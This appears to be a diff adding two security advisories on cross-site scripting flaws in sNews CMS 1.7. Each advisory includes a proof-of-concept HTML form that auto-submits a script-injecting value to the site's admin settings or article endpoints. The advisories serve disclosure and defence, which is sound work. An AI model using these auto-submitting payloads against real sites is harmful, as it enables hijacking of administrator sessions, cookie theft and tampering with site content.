@@ -1,0 +1,92 @@
+Vulnerability ID: HTB22638
+Reference: http://www.htbridge.ch/advisory/xss_vulnerability_in_snews_1.html
+Product: sNews
+Vendor: sNews Team ( tp://www.snewscms.com/ ) 
+Vulnerable Version: 1.7 and probably prior versions
+Vendor Notification: 05 October 2010 
+Vulnerability Type: XSS (Cross Site Scripting)
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: Medium 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "snews.php" script to properly sanitize user-supplied input in "website_title" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/?action=process&task=save_settings" method="post" name="main" >
+
+<input type="hidden" name="website_title" value='sNews 1.7"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="home_sef" value="home">
+<input type="hidden" name="website_description" value="sNews CMS">
+<input type="hidden" name="website_keywords" value="snews">
+<input type="hidden" name="website_email" value="info (at) mydomain (dot) com [email concealed]">
+<input type="hidden" name="contact_subject" value="Contact Form">
+<input type="hidden" name="language" value="EN">
+<input type="hidden" name="charset" value="UTF-8">
+<input type="hidden" name="date_format" value="d.m.Y.+H:i">
+<input type="hidden" name="article_limit" value="3">
+<input type="hidden" name="rss_limit" value="5">
+<input type="hidden" name="display_page" value="0">
+<input type="hidden" name="num_categories" value="on">
+<input type="hidden" name="file_ext" value="phps,php,txt,inc,htm,html">
+<input type="hidden" name="allowed_file" value="php,htm,html,txt,inc,css,js,swf">
+<input type="hidden" name="allowed_img" value="gif,jpg,jpeg,png">
+<input type="hidden" name="comment_repost_timer" value="20">
+<input type="hidden" name="comments_order" value="ASC">
+<input type="hidden" name="comment_limit" value="30">
+<input type="hidden" name="word_filter_file" value="">
+<input type="hidden" name="word_filter_change" value="">
+<input type="hidden" name="save" value="Save">
+
+</form>
+<script>
+document.main.submit();
+</script>
+
+Vulnerability ID: HTB22637
+Reference: http://www.htbridge.ch/advisory/xss_vulnerability_in_snews.html
+Product: sNews
+Vendor: sNews Team ( http://www.snewscms.com/ ) 
+Vulnerable Version: 1.7 and probably prior versions
+Vendor Notification: 05 October 2010 
+Vulnerability Type: Stored XSS (Cross Site Scripting)
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: Medium 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "snews.php" script to properly sanitize user-supplied input in "text" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+<form action="http://host/?action=process&task=admin_article&id=2" method="post" name="main" >
+
+<input type="hidden" name="title" value="article title" />
+<input type="hidden" name="seftitle" value="sefurl" />
+<input type="hidden" name="text" value='article text"><script>alert(document.cookie)</script>' />
+<input type="hidden" name="define_category" value="1" />
+<input type="hidden" name="publish_article" value="on" />
+<input type="hidden" name="position" value="1" />
+<input type="hidden" name="description_meta" value="desc" />
+<input type="hidden" name="keywords_meta" value="key" />
+<input type="hidden" name="display_title" value="on" />
+<input type="hidden" name="display_info" value="on" />
+<input type="hidden" name="fposting_day" value="29" />
+<input type="hidden" name="fposting_month" value="9" />
+<input type="hidden" name="fposting_year" value="2010" />
+<input type="hidden" name="fposting_hour" value="16" />
+<input type="hidden" name="fposting_minute" value="40" />
+<input type="hidden" name="task" value="admin_article" />
+<input type="hidden" name="edit_article" value="Edit" />
+<input type="hidden" name="article_category" value="1" />
+<input type="hidden" name="id" value="2" />
+
+</form>
+<script>
+document.main.submit();
+</script>
